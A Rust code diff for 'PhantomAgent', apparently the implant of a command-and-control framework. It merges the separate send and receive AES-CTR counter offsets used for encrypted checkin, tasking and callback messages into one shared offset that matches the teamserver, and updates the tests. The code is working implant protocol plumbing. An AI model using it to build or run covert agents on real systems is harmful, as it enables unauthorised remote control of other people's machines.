@@ -28,8 +28,11 @@ pub struct PhantomAgent {
     session_crypto: AgentCryptoMaterial,
     config: PhantomConfig,
     transport: HttpTransport,
-    send_ctr_offset: u64,
-    recv_ctr_offset: u64,
+    /// Shared monotonic CTR block offset, mirroring the server's single offset.
+    ///
+    /// Both encrypt (send) and decrypt (recv) operations use and advance this
+    /// single counter, matching the teamserver's `AgentEntry::ctr_block_offset`.
+    ctr_offset: u64,
     state: PhantomState,
 }
 
@@ -54,8 +57,7 @@ impl PhantomAgent {
             session_crypto,
             config,
             transport,
-            send_ctr_offset: 0,
-            recv_ctr_offset: 0,
+            ctr_offset: 0,
             state: PhantomState::default(),
         })
     }
@@ -102,7 +104,7 @@ impl PhantomAgent {
         let metadata = self.collect_metadata();
         let packet = build_init_packet(self.agent_id, &self.raw_crypto, &metadata)?;
         let response = self.transport.send(&packet).await?;
-        self.recv_ctr_offset = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
+        self.ctr_offset = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
         Ok(())
     }
 
@@ -118,22 +120,22 @@ impl PhantomAgent {
         let encrypted = red_cell_common::crypto::encrypt_agent_data_at_offset(
             &self.session_crypto.key,
             &self.session_crypto.iv,
-            self.send_ctr_offset,
+            self.ctr_offset,
             &payload,
         )?;
         let packet = red_cell_common::demon::DemonEnvelope::new(self.agent_id, encrypted.clone())?
             .to_bytes();
 
         let response = self.transport.send(&packet).await?;
-        self.send_ctr_offset += callback_ctr_blocks(0);
+        self.ctr_offset += callback_ctr_blocks(0);
 
         let tasking = parse_tasking_response(
             self.agent_id,
             &self.session_crypto,
-            self.recv_ctr_offset,
+            self.ctr_offset,
             &response,
         )?;
-        self.recv_ctr_offset = tasking.next_recv_ctr_offset;
+        self.ctr_offset = tasking.next_ctr_offset;
 
         let mut exit_requested = false;
         for package in tasking.packages {
@@ -143,13 +145,13 @@ impl PhantomAgent {
                 let packet = build_callback_packet(
                     self.agent_id,
                     &self.session_crypto,
-                    self.send_ctr_offset,
+                    self.ctr_offset,
                     callback.command_id(),
                     callback.request_id(),
                     &payload,
                 )?;
                 self.send_packet(packet).await?;
-                self.send_ctr_offset += callback_ctr_blocks(payload.len());
+                self.ctr_offset += callback_ctr_blocks(payload.len());
                 if matches!(callback, PendingCallback::Exit { .. }) {
                     exit_requested = true;
                 }
@@ -233,13 +235,13 @@ impl PhantomAgent {
             let packet = build_callback_packet(
                 self.agent_id,
                 &self.session_crypto,
-                self.send_ctr_offset,
+                self.ctr_offset,
                 callback.command_id(),
                 callback.request_id(),
                 &payload,
             )?;
             self.send_packet(packet).await?;
-            self.send_ctr_offset += callback_ctr_blocks(payload.len());
+            self.ctr_offset += callback_ctr_blocks(payload.len());
         }
 
         Ok(())
@@ -547,7 +549,7 @@ mod tests {
 
         let init_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
         assert!(!init_packet.is_empty());
-        assert_eq!(agent.recv_ctr_offset, 1);
+        assert_eq!(agent.ctr_offset, 1);
 
         let server_result = server.join().map_err(|_| "server thread panicked")?;
         server_result?;
@@ -590,17 +592,23 @@ mod tests {
         let init_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
         assert!(!init_packet.is_empty());
 
+        // After init_handshake, ctr_offset == 1.  The agent will:
+        //   1. encrypt checkin at ctr_offset=1, advance by callback_ctr_blocks(0)
+        //   2. decrypt tasking at the new ctr_offset, advance by ctr_blocks_for_len(encrypted_task)
+        //   3. encrypt exit callback at the next ctr_offset, advance by callback_ctr_blocks(4)
+        let checkin_encrypt_offset = agent.ctr_offset; // 1
+        let after_checkin_send = checkin_encrypt_offset + callback_ctr_blocks(0);
+
         let task = DemonPackage::new(DemonCommand::CommandExit, 7, 9_i32.to_le_bytes().to_vec());
         let task_message = DemonMessage::new(vec![task]).to_bytes()?;
         let encrypted_task = encrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
-            agent.recv_ctr_offset,
+            after_checkin_send,
             &task_message,
         )?;
         let response = DemonEnvelope::new(agent.agent_id, encrypted_task)?.to_bytes();
-        let expected_recv_ctr_offset =
-            agent.recv_ctr_offset + ctr_blocks_for_len(response.len() - 12);
+        let after_tasking_recv = after_checkin_send + ctr_blocks_for_len(response.len() - 12);
         response_tx.send(response)?;
         response_tx.send(Vec::new())?;
 
@@ -612,14 +620,14 @@ mod tests {
         let decrypted = decrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
-            0,
+            checkin_encrypt_offset,
             &envelope.payload,
         )?;
         let message = DemonMessage::from_bytes(&decrypted)?;
         assert_eq!(message.packages.len(), 1);
         assert_eq!(message.packages[0].command()?, DemonCommand::CommandCheckin);
-        assert_eq!(agent.send_ctr_offset, callback_ctr_blocks(0) + callback_ctr_blocks(4));
-        assert_eq!(agent.recv_ctr_offset, expected_recv_ctr_offset);
+        let expected_final_offset = after_tasking_recv + callback_ctr_blocks(4);
+        assert_eq!(agent.ctr_offset, expected_final_offset);
 
         let exit_callback_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
         assert!(!exit_callback_packet.is_empty());
@@ -661,12 +669,16 @@ mod tests {
             &agent.agent_id.to_le_bytes(),
         )?)?;
 
+        // After init: ctr_offset = 1.
+        // Checkin sends at offset 1, advances by callback_ctr_blocks(0).
+        // Task must be encrypted at the offset after the checkin send.
+        let after_checkin_send = 1 + callback_ctr_blocks(0);
         let task = DemonPackage::new(DemonCommand::CommandExit, 42, 1_i32.to_le_bytes().to_vec());
         let task_message = DemonMessage::new(vec![task]).to_bytes()?;
         let encrypted_task = encrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
-            1,
+            after_checkin_send,
             &task_message,
         )?;
         response_tx.send(DemonEnvelope::new(agent.agent_id, encrypted_task)?.to_bytes())?;
@@ -682,7 +694,7 @@ mod tests {
         let decrypted = decrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
-            0,
+            1, // checkin encrypted at ctr_offset=1 (after init ack)
             &envelope.payload,
         )?;
         let message = DemonMessage::from_bytes(&decrypted)?;
